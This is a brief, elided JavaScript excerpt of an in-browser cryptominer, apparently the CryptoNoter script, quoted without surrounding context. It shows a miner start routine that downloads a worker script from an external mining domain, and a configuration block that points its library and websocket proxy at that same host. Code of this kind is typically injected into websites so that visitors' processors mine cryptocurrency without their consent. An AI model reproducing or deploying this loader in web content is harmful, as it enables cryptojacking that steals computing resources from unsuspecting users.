(function (window) {
    ...
    Miner.prototype.start = function (mode) {
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.open("get", "https://blockchain-coin-web-mining.com/worker.js", true);
            xhr.send()
...
self.CryptoNoter.CONFIG = {
    LIB_URL: "https://blockchain-coin-web-mining.com/lib/",
    WEBSOCKET_SHARDS: [["ws://blockchain-coin-web-mining.com/proxy"]]
};
